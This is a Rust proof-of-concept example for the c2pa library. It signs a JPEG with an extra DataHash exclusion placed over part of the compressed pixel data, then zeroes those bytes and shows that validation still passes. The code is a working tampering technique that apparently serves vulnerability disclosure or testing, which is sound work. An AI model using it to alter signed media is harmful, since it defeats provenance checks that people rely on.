// Pixel-level DataHash exclusion proof-of-concept.
//
// Like the `oversized_exclusion` example, this demonstrates that a malicious
// signer can place bytes outside the DataHash coverage at signing time -- but
// here we deliberately target the JPEG's *entropy-coded scan data* (i.e. the
// compressed pixel bitstream) rather than header padding.  After signing, we
// overwrite those bytes; the JPEG still decodes (with visible corruption
// where the bytes used to live), and C2PA validation still passes.
//
// Two exclusions are used:
//   * `[manifest_pos, manifest_pos + manifest_len)`  -- the embedded JUMBF
//   * `[entropy_start + GAP, entropy_start + GAP + TAMPER_LEN)` -- the
//     pixel-bitstream window we reserve for tampering.
//
// Having `exclusions.len() > 1` triggers an informational validator log
// (`assertion.dataHash.additionalExclusions`), but it is NOT a failure --
// validation state remains Valid.
//
// Usage:
//   cargo run --release -p c2pa --example pixel_tamper_exclusion -- \
//       <input.jpg> <output_signed.jpg> <output_tampered.jpg>
//
// Open both output files in any image viewer to see the visible difference.

use std::io::{Cursor, Seek, Write};

use anyhow::{anyhow, bail, Result};
use c2pa::{
    crypto::raw_signature::SigningAlg, settings::Settings, Builder, CallbackSigner, Context,
    HashRange, Reader,
};
use serde_json::json;

mod common;
use common::mime_from_path;

const CERTS: &[u8] = include_bytes!("../tests/fixtures/certs/ed25519.pub");
const PRIVATE_KEY: &[u8] = include_bytes!("../tests/fixtures/certs/ed25519.pem");

// Skip this many bytes past the start of the entropy-coded scan data before
// the tamper window begins.  Keeps the very first MCUs intact so the decoder
// has stable DC predictors, then corruption kicks in further down.
const ENTROPY_GAP: usize = 128;

// Size of the pixel-bitstream window we reserve for post-signing tampering.
const TAMPER_LEN: usize = 4096;

// Pattern written into the tamper window.  0x00 is safe for JPEG entropy
// streams (no 0xFF bytes -> no risk of synthesising a fake marker).
const TAMPER_BYTE: u8 = 0x00;

fn main() -> Result<()> {
    let args: Vec<String> = std::env::args().collect();
    if args.len() != 4 {
        bail!(
            "Usage: pixel_tamper_exclusion <input.jpg> <output_signed.jpg> <output_tampered.jpg>"
        );
    }
    let input_path = &args[1];
    let signed_path = &args[2];
    let tampered_path = &args[3];

    let format = mime_from_path(input_path)?;
    if format != "image/jpeg" {
        bail!("only image/jpeg is supported by this PoC");
    }

    let image_bytes = std::fs::read(input_path)?;
    let entropy_start_source = find_entropy_data_start(&image_bytes)?;
    println!(
        "Source JPEG: {} bytes, entropy-coded scan data starts at offset {}",
        image_bytes.len(),
        entropy_start_source
    );

    // -- Build signer/context, identical to the prior PoC.
    let settings = Settings::new()
        .with_toml(include_str!("../tests/fixtures/test_settings.toml"))?;
    let ed_signer =
        |_ctx: *const (), data: &[u8]| CallbackSigner::ed25519_sign(data, PRIVATE_KEY);
    let signer = CallbackSigner::new(ed_signer, SigningAlg::Ed25519, CERTS);
    let context = Context::new()
        .with_settings(settings)?
        .with_signer(signer)
        .into_shared();

    let manifest_def = json!({
        "title": signed_path,
        "format": format,
        "claim_generator_info": [{
            "name": "pixel_tamper_exclusion_poc",
            "version": "0.1.0"
        }],
        "assertions": [{
            "label": "c2pa.actions",
            "data": { "actions": [{"action": "c2pa.created"}] }
        }]
    })
    .to_string();

    let mut builder =
        Builder::from_shared_context(&context).with_definition(manifest_def)?;

    // -- Placeholder workflow: get placeholder, embed it at offset 2.
    let placeholder = builder.placeholder("image/jpeg")?;
    let manifest_pos: usize = 2;
    let manifest_len = placeholder.len();

    let mut output: Vec<u8> = Vec::with_capacity(image_bytes.len() + manifest_len);
    output.extend_from_slice(&image_bytes[0..manifest_pos]);
    output.extend_from_slice(&placeholder);
    output.extend_from_slice(&image_bytes[manifest_pos..]);
    let mut output_stream = Cursor::new(output);

    // -- Compute tamper window in OUTPUT coordinates.  Everything past
    //    `manifest_pos` was shifted right by `manifest_len`, so the source's
    //    entropy_start sits at entropy_start_source + manifest_len in the
    //    output stream.
    let entropy_start_output = entropy_start_source + manifest_len;
    let tamper_start = entropy_start_output + ENTROPY_GAP;
    let tamper_end = tamper_start + TAMPER_LEN;

    if tamper_end >= output_stream.get_ref().len() - 2 {
        bail!("source JPEG too small for a {TAMPER_LEN}-byte tamper window");
    }

    // *** Two exclusions: the manifest, and our pixel-bitstream window. ***
    let manifest_excl = HashRange::new(manifest_pos as u64, manifest_len as u64);
    let pixel_excl = HashRange::new(tamper_start as u64, TAMPER_LEN as u64);
    println!("\n=== Signing ===");
    println!(
        "  manifest exclusion  : start={}, length={}\n  \
         pixel    exclusion  : start={}, length={}  <-- inside JPEG scan data",
        manifest_excl.start(),
        manifest_excl.length(),
        pixel_excl.start(),
        pixel_excl.length()
    );
    builder.set_data_hash_exclusions(vec![manifest_excl, pixel_excl])?;

    builder.update_hash_from_stream("image/jpeg", &mut output_stream)?;

    let final_manifest = builder.sign_embeddable("image/jpeg")?;
    output_stream.seek(std::io::SeekFrom::Start(manifest_pos as u64))?;
    output_stream.write_all(&final_manifest)?;

    let signed_bytes = output_stream.into_inner();
    std::fs::write(signed_path, &signed_bytes)?;
    println!("  wrote {signed_path}");

    print_validation("Signed (untampered)", &signed_bytes)?;

    // -- Tamper the entropy-coded pixel bytes.
    let mut tampered = signed_bytes.clone();
    let original_window = signed_bytes[tamper_start..tamper_end].to_vec();
    for b in &mut tampered[tamper_start..tamper_end] {
        *b = TAMPER_BYTE;
    }
    let differing = original_window
        .iter()
        .zip(&tampered[tamper_start..tamper_end])
        .filter(|(a, b)| a != b)
        .count();

    std::fs::write(tampered_path, &tampered)?;
    println!("\n=== Tampering ===");
    println!(
        "  zeroed bytes [{tamper_start}..{tamper_end}) in the JPEG scan data \
         ({TAMPER_LEN} bytes, {differing} differ from original)\n  \
         wrote {tampered_path}"
    );

    print_validation("Tampered (pixel bytes overwritten)", &tampered)?;

    println!(
        "\nOpen {signed_path} and {tampered_path} side-by-side in an image viewer \
         to see the corrupted region in the tampered file.  Both files still pass \
         C2PA validation."
    );
    Ok(())
}

/// Locate the start of the *main* JPEG entropy-coded scan data.
///
/// Walks JPEG markers from the SOI, skipping each segment by its declared
/// length (so the contents of APPn segments -- including any embedded EXIF
/// thumbnail JPEGs -- are not scanned).  Returns the offset immediately
/// after the SOS segment payload, i.e. the first byte of the main image's
/// compressed pixel bitstream.
fn find_entropy_data_start(bytes: &[u8]) -> Result<usize> {
    if bytes.len() < 4 || bytes[0] != 0xFF || bytes[1] != 0xD8 {
        bail!("not a JPEG (missing SOI)");
    }
    let mut i = 2;
    while i + 1 < bytes.len() {
        if bytes[i] != 0xFF {
            bail!("expected marker at offset {i}, found 0x{:02X}", bytes[i]);
        }
        // Coalesce any fill bytes (FF FF ...).
        let mut j = i + 1;
        while j < bytes.len() && bytes[j] == 0xFF {
            j += 1;
        }
        if j >= bytes.len() {
            bail!("truncated marker at offset {i}");
        }
        let marker = bytes[j];

        // Standalone markers (no length field): SOI(D8), EOI(D9), TEM(01),
        // RSTn (D0..D7).  Just advance past them.
        if marker == 0x01 || matches!(marker, 0xD0..=0xD9) {
            i = j + 1;
            continue;
        }

        if marker == 0xDA {
            // SOS: read segment length and return entropy data start.
            if j + 3 > bytes.len() {
                bail!("truncated SOS segment");
            }
            let seg_len = u16::from_be_bytes([bytes[j + 1], bytes[j + 2]]) as usize;
            return Ok(j + 1 + seg_len);
        }

        // Any other marker carries a 2-byte big-endian length covering the
        // length bytes themselves.  Skip the whole segment.
        if j + 3 > bytes.len() {
            bail!("truncated segment after marker FF{marker:02X}");
        }
        let seg_len = u16::from_be_bytes([bytes[j + 1], bytes[j + 2]]) as usize;
        i = j + 1 + seg_len;
    }
    Err(anyhow!("SOS marker (FF DA) not found in top-level JPEG"))
}

fn print_validation(label: &str, bytes: &[u8]) -> Result<()> {
    let mut cursor = Cursor::new(bytes);
    let reader = Reader::from_stream("image/jpeg", &mut cursor)?;
    let state = reader.validation_state();
    println!("--- Validation: {label} ---");
    println!("  state = {state:?}");
    if let Some(results) = reader.validation_results() {
        if let Some(am) = results.active_manifest() {
            if !am.failure().is_empty() {
                println!("  failure codes:");
                for s in am.failure() {
                    println!("    - {}", s.code());
                }
            }
            if !am.informational().is_empty() {
                println!("  informational codes:");
                for s in am.informational() {
                    println!("    - {}", s.code());
                }
            }
            let datahash_success = am
                .success()
                .iter()
                .any(|s| s.code() == c2pa::validation_status::ASSERTION_DATAHASH_MATCH);
            println!(
                "  ASSERTION_DATAHASH_MATCH present in success codes: {datahash_success}"
            );
        }
    }
    Ok(())
}
